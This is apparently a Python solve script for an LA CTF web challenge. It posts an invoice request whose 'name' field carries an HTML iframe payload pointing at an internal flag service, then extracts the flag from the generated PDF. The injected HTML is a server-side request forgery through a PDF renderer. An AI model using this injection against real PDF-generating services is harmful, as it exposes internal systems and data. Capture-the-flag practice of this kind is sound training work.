import io
import re
from urllib.parse import urljoin

import PyPDF2
import requests

HOST = "https://lactf-invoice-generator-p6h6v.instancer.lac.tf/"


def url(path):
    return urljoin(HOST, path)


def main():
    json = {
        "name": '<iframe src="http://flag:8081/flag"></iframe>',
        "item": "A",
        "cost": "0",
        "datePurchased": "2026-02-09",
    }
    r = requests.post(url("/generate-invoice"), json=json)

    pdf = PyPDF2.PdfReader(io.BytesIO(r.content))

    for p in pdf.pages:
        match = re.search("lactf{.+}", p.extract_text())

        if match:
            print(match.group())


if __name__ == "__main__":
    main()
